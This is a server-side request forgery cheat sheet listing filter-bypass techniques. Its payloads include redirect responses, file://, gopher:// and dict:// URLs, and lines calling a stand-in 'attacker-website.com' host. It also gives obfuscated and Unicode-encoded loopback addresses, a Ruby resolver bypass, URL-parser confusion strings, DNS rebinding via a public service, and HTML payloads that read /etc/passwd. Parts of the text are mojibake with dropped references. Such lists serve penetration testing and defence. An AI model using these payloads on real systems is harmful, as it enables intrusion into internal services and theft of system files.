# SSRF Server Side Request Forgery

Server-side request forgery (or SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.

## Bypass filters

Applications often block input containing non-whitelist hostnames, sensitive URLs, or IP addresses like loopback, IPv4 link-local, , etc. In this situation, it is sometimes possible to bypass the filter using various techniques.

## Redirection

You can try using a redirection to the desired URL to bypass the filter. To do this, return a response with the 3xx code and the desired URL in the Location header to the request from the vulnerable server, for example:
```
HTTP/1.1 301 Moved Permanently
Server: nginx
Connection: close
Content-Length: 0
Location: http://127.0.0.1
```

You can achieve redirection in the following ways:
-bash, like nc -lvp 80 < response.txt

-URL shortener services

-Mock and webhook services, see â€‹

-More flexible solutions such as a simple HTTP server on python

Also, if the application contains an open redirection vulnerability you can use it to bypass the URL filter, for example:
```
POST /api/v1/webhook HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
â€‹
url=https://vulnerable-website.com/api/v1/project/next?currentProjectId=1929851&path=http://127.0.0.1
```

These bypass approaches work because the application only validates the provided URL, which triggers the redirect. It follows the redirect and makes a request to the internal URL of the attacker's choice.

### URL scheme
You can try to use different URL schemes:
```
file://path/to/file
dict://<user-;<auth-@<host-:<port-/d:<word-:<database-:<n-
dict://127.0.0.1:1337/stats
ftp://127.0.0.1/
sftp://attacker-website.com:1337/
tftp://attacker-website.com:1337/TESTUDPPACKET
ldap://127.0.0.1:389/%0astats%0aquit
ldaps://127.0.0.1:389/%0astats%0aquit
ldapi://127.0.0.1:389/%0astats%0aquit
gopher://attacker-website.com/_SSRF%0ATest!
```

####Â Node.js
Node.js for Windows considers any single letter in a URL scheme as drive://filepath and set the protocol to file://.
```
// Node.js (Windows only)
// the following row will return `file:`
new URL('l://file').protocol
```

#### Java
Java's URL will correctly handle the next URLs:
```
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## IP address formats

You can try using a different IP address format to bypass the filter.

#### Rare IP address
Rare IP address formats, defined in :
-Dotted hexadecimal IP: 0x7f.0x0.0x0.0x1

-Dotless hexadecimal IP: 0x7f001

-Dotless hexadecimal IP with padding: 0x0a0b0c0d7f000001 (padding is 0a0b0c0d)

-Dotless decimal IP: 2130706433

-Dotted decimal IP with overflow (256): 383.256.256.257

-Dotted octal IP: 0177.0.0.01

-Dotless octal IP: 017700000001

-Dotted octal IP with padding: 00177.000.0000.000001

-Combined:
```
0x7f.0.1
0x7f.1
00177.1
00177.0x0.1
```

You can short-hand IP addresses by dropping the zeros:
```
1 part  (ping A)       : 0.0.0.A
2 parts (ping A.B)     : A.0.0.B
3 parts (ping A.B.C)   : A.B.0.C
4 parts (ping A.B.C.D) : A.B.C.D
â€‹
0       =- 0.0.0.0
127.1   =- 127.0.0.1
127.0.1 =- 127.0.0.1
```

#### IPv6 address
-IPv6 localhost:
```
[::]
0000::1
[::1]
0:0:0:0:0:0:0:0
```
-IPv4-mapped IPv6 address: [::ffff:7f00:1]

-IPv4-mapped IPv6 address: [::ffff:127.0.0.1]

-IPv4-compatible IPv6 address (deprecated, q.v. : [::127.0.0.1]

-IPv4-mapped IPv6 address with : [::ffff:7f00:1%25]

-IPv4-mapped IPv6 address with : [::ffff:127.0.0.1%eth0]

#### Abuse of enclosed alphanumerics
Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanumeric within a circle, a bracket or other not-closed enclosure, or ending in a full stop, q.v. .
```
127ã€‚0ã€‚0ã€‚1
127ï½¡0ï½¡0ï½¡1
127ï¼Ž0ï¼Ž0ï¼Ž1
â‘«ï¼—ï½¡â“ªï¼ŽðŸ¢ã€‚ðŸ·
ðŸ˜ð–ƒðŸ•ð’‡ï½¡ðŸ˜ð”µðŸ¢ï½¡ðŸ¢ð™­â“ªï½¡ðŸ˜ð™“Â¹
â°ð”ðŸ³ð™›ðŸ¢ï¼ï¼‘
ï¼’ðŸðŸ‘ðŸ¢ðŸ•ðŸ¢ï¼–ðŸºðŸ›ðŸ‘
ðŸ¥ðŸªÂ³ã€‚ðŸšâµðŸžã€‚Â²â‚…ðŸžã€‚Â²ðŸ§ðŸŸ
ðŸ¢â‚ðŸ³â‚‡ï½¡ï¼ï½¡ï¼ï½¡ðŸ¢ðŸ·
ðŸŽðŸ¢ðŸ™â‘¦â·ã€‚ï¼ï¼ï¼ã€‚ðŸ¶ðŸ¬ðŸ¢ðŸ˜ã€‚ðŸŽâ‚€ðŸŽðŸ¢ï¼ðŸ£
[::ðŸâ‘¡â‚‡ï¼ŽðŸ˜ï¼Žâ‚€ï¼ŽðŸ·]
[::ðŸ­ï¼’ðŸŸï½¡â“ªï½¡â‚€ï½¡ðŸ£%ðŸ¸ðŸ­â‘¤]
[::ðšð•±á¶ ð•—:ðŸâ‚‚ï¼—ï½¡â‚€ï½¡ðŸ¢ï½¡â‘ ]
[::ð’‡â„±ð”£ð¹:ðŸ£ðŸ¤ï¼—ã€‚â‚€ã€‚ï¼ã€‚â‚%â‘¡Â¹ðŸ§]
ðŸŽðš‡ðŸ•ð–‹ï½¡â“ªï½¡ðŸ£
ðŸŽË£ðŸ©ð˜ï½¡ðŸ·
ðŸ˜ðŸ˜â‘ ðŸ•â‘¦ï¼Žï¼‘
â“ªðŸ˜ðŸ™ðŸ³ðŸ½ï½¡ðŸŽð“§â‚€ï½¡ðŸ
```

### Abusing a bug in Ruby's native resolver
Resolv::getaddresses is OS-dependent, therefore by playing around with different IP formats one can return blank values.
Proof of concept:
```
irb(main):001:0- require 'resolv'
=- true
irb(main):002:0- uri = "0x7f.1"
=- "0x7f.1"
irb(main):003:0- server_ips = Resolv.getaddresses(uri)
=- [] # The bug!
irb(main):004:0- blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=- ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0- (blocked_ips & server_ips).any?
=- false # Bypass
```
â€‹â€‹
â€‹â€‹
## Broken parser
The  contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

-Embedded credentials in a URL before the hostname, using the @ character: https://expected-host@evil-host

-Indication a URL fragment using the # character: https://evil-host#expected-host

-DNS naming hierarchy: https://expected-host.evil-host

-URL-encode characters. This can help confuse URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.

Combinations of these techniques together:
```
foo@evil-host:80@expected-host
foo@evil-host%20@expected-host
evil-host%09expected-host
127.1.1.1:80\@127.2.2.2:80
127.1.1.1:80:\@@127.2.2.2:80
127.1.1.1:80#\@127.2.2.2:80
ÃŸ.evil-host
```
â€‹â€‹
â€‹â€‹
â€‹â€‹## DNS pinning
If you want to get a A-record that resolves to an IP, use the following subdomain:
```
make-<IP--rr.1u.ms 
```

For example, domain resolves make-127-0-0-1-rr.1u.ms to 127.0.0.1:
```
$ dig A make-127-0-0-1-rr.1u.ms
make-127-0-0-1-rr.1u.ms. 0	IN	A	127.0.0.1
```

Multiple records can be separated by -and-:
```
make-<IP--and-<IP--rr.1u.ms
```

For example, domain resolves make-127-0-0-1-and-127-127-127-127-rr.1u.ms to 127.0.0.1 and 127.127.127.127:
```
$ dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.0.0.1
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.127.127.127
```

## DNS rebinding
If the mechanisms in vulnerable application for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by manipulating the DNS resolution response.
For example, if two requests go one after the other within 5 seconds, DNS resolution make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms will return the address 1.1.1.1 by the first request, and the second - 127.0.0.1.
```
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 1.1.1.1
â€‹
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 127.0.0.1
```
â€‹â€‹
â€‹â€‹
## Server-side processing of arbitrary HTML and JS

Server-side processing of arbitrary HTML and JS data from a user can often be found when generating various documents, for example, to PDFs. If this functionality is vulnerable to HTML injection and/or XSS, you can use this to access internal resources:
```
<iframe src="file:///etc/passwd" width="400" height="400"-
<img src onerror="document.write('<iframe src=//127.0.0.1-</iframe-')"-
```

Use HTTPLeaks to determine if any of the allowed HTML tags could be used to abuse the processing.

â€‹